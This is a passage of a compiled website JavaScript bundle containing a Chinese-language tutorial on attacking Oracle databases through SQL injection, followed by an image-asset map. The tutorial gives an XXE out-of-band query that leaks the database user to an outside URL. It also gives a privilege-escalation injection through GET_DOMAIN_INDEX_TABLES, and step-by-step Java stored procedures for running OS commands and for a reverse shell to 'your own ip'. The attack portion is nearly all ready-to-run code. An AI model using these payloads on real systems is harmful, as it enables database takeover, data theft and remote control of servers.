\u6743\u9650\u65f6\uff0c\u8fd9\u4e2a\u4e0d\u5931\u4e3a\u4e00\u4e2a\u597d\u65b9\u6cd5"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"you own url/?'||(SELECT user from dual)||'\"> %remote;]>'),'/l') from dual;\n"})}),"\n",(0,r.jsx)(s.h3,{id:"oracle-\u63d0\u6743\u6f0f\u6d1e",children:"Oracle \u63d0\u6743\u6f0f\u6d1e"}),"\n",(0,r.jsxs)(s.p,{children:["\u539f\u7406\u662f ",(0,r.jsx)(s.code,{children:"GET_DOMAIN_INDEX_TABLES"})," \u51fd\u6570\u7684\u53c2\u6570\u5b58\u5728\u6ce8\u5165\u3002\u800c\u8be5\u51fd\u6570\u7684\u6240\u6709\u8005\u662f sys\uff0c\u6240\u4ee5\u901a\u8fc7\u6ce8\u5165\u5c31\u53ef\u4ee5\u6267\u884c\u4efb\u610f sql \u8bed\u53e5\u3002\u800c\u8be5\u51fd\u6570\u7684\u6267\u884c\u6743\u9650\u4e3a public\uff0c\u6240\u4ee5\u53ea\u8981\u9047\u5230\u4e00\u4e2a Oracle \u7684\u6ce8\u5165\u70b9\u5e76\u4e14\u5b58\u5728\u8fd9\u4e2a\u6f0f\u6d1e\u7684\uff0c\u57fa\u672c\u4e0a\u90fd\u53ef\u4ee5\u63d0\u5347\u5230\u6700\u9ad8\u6743\u9650\u3002"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(\n    '1',\n    '1',\n    'DBMS _OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''your own payload'''';END;'';END;--',\n    'SYS',\n    0,\n    '1',\n    0\n) from dual;\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u6743\u9650\u63d0\u5347\u4e4b\u540e\u5c31\u53ef\u4ee5\u505a\u5f88\u591a\u4e8b\u4e86\uff0c\u56e0\u4e3a Oracle \u53ef\u4ee5\u6267\u884c JAVA \u4ee3\u7801\uff0c\u6240\u4ee5\u5728\u63d0\u5347\u6743\u9650\u540e\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\uff0c\u5c31\u770b\u5404\u81ea\u7684 JAVA \u6c34\u5e73\u4e86\u3002"}),"\n",(0,r.jsxs)(s.p,{children:["\u8fd9\u91cc\u7ed9\u51fa\u51e0\u79cd\u5e38\u89c1\u7684\u5229\u7528\u65b9\u5f0f\uff08\u4ee5\u4e0b\u5747\u4e3a ",(0,r.jsx)(s.code,{children:"your own payload"})," \u5904\u7684\u4ee3\u7801\uff09\uff1a"]}),"\n",(0,r.jsx)(s.h4,{id:"\u547d\u4ee4\u6267\u884c",children:"\u547d\u4ee4\u6267\u884c"}),"\n",(0,r.jsx)(s.p,{children:"1\u3001\u521b\u5efaJAVA\u4ee3\u7801"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:'create or replace and compile java source named "Command" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"\\n";inBr.close();in.close();return sb;}}\n'})}),"\n",(0,r.jsx)(s.p,{children:"2\u3001\u8d4b\u4e88\u4ee3\u7801\u6267\u884c\u6743\u9650"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;\n"})}),"\n",(0,r.jsx)(s.p,{children:"3\u3001\u521b\u5efa\u51fd\u6570"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String'''''''';\n"})}),"\n",(0,r.jsx)(s.p,{children:"4\u3001\u8d4b\u4e88\u51fd\u6570\u6267\u884c\u6743\u9650"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"grant all on cmd to public\n"})}),"\n",(0,r.jsx)(s.p,{children:"5\u3001\u6267\u884c\u547d\u4ee4"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select sys.cmd('whoami') from dual;\n"})}),"\n",(0,r.jsx)(s.h4,{id:"\u53cd\u5f39shell",children:"\u53cd\u5f39shell"}),"\n",(0,r.jsx)(s.p,{children:"1\u3001\u521b\u5efajava\u4ee3\u7801"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:'create or replace and compile java source named "shell" as import java.io.*;import java.net.*;public class shell{public static void run() throws Exception {Socket s = new Socket("your own ip", 80);Process p = Runtime.getRuntime().exec("cmd.exe");new T(p.getInputStream(), s.getOutputStream()).start();new T(p.getErrorStream(), s.getOutputStream()).start();new T(s.getInputStream(), p.getOutputStream()).start();}static class T extends Thread {private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) {this.u = out;this.i = in;}public void run() {BufferedReader n = new BufferedReader(new InputStreamReader(i));BufferedWriter w = new BufferedWriter(new OutputStreamWriter(u));char f[] = new char[8192];int l;try {while ((l = n.read(f, 0, f.length)) > 0) {w.write(f, 0, l);w.flush();}} catch (IOException e) {}try {if (n != null)n.close();if (w != null)w.close();} catch (Exception e) {}}}}\n'})}),"\n",(0,r.jsx)(s.p,{children:"2\u3001\u8d4b\u4e88\u4ee3\u7801\u6267\u884c\u6743\u9650"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''<>'''''''', ''''''''*'''''''' );end;\n"})}),"\n",(0,r.jsx)(s.p,{children:"3\u3001\u521b\u5efa\u51fd\u6570"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; \n"})}),"\n",(0,r.jsx)(s.p,{children:"4\u3001\u8d4b\u4e88\u51fd\u6570\u6267\u884c\u6743\u9650"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"grant all on reversetcp to public\n"})}),"\n",(0,r.jsx)(s.p,{children:"5\u3001\u6267\u884c\u547d\u4ee4"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"select sys.reversetcp from dual;\n"})})]})}function o(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},29958:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223203139865-d4369e3110b4bc09b08758e18ad6e9a2.png"},29960:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224114331456-e90cd640415d7e85363ef95f4622642a.png"},30822:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223201953526-5c4fcceeb8c5a220cfec190107ebc847.png"},31309:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224134250563-9a14872a8fcbb8ea661a70df156429e6.png"},33868:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224134227825-40bd97c300015e89af035a121d10c952.png"},37424:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223201801494-df4d88c4afe5528337eb2ed2c0def03d.png"},48965:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223201858440-84251795946353d2f5f75d2c9e1fb2f3.png"},53788:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223205329875-f5c87e3726e25706375e95dfb6741818.png"},55400:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223204735057-6fdd33eb2c68c0ef757a0a15edc1bcc1.png"},58845:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223205504068-d5fa526a876ab626d40bc82eac372c7d.png"},65355:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223190145819-73cf108eb1b9fee05beb04e9bc88536e.png"},67348:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223200551361-d5720c4b88897e308710c56f1d3ccada.png"},70758:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224113307517-a00b381b382b1ff7a4ad8351d5dea8da.png"},75211:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223203016136-466713c0f624119aebdb9ddc7c68b1ad.png"},83108:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223190103007-055f064ee1b367d9012663228d67be39.png"},83431:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223204314455-0f4f48ce4a76f18d6779e5de5c4b9a9d.png"},84103:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223200815996-230faa2ee990af18ff5f2b80ce21c9c1.png"},85603:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223201648290-082f2088ea399497161831f827e86113.png"},89025:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223202757357-21aa2751de5ac41e1d900dd4ec2a276a.png"},93035:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211224111541217-ee1175c519367773df8c5a92be3311a0.png"},94314:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223202526969-6a4577012cd5ef39bb7a1abb6e396590.png"},96465:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223200744759-20975a4355c564fc2a81cbd043187a8d.png"},99337:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20211223200642642-f6a32e7b5458a02a3cb865e05e82e52b.png"}}]);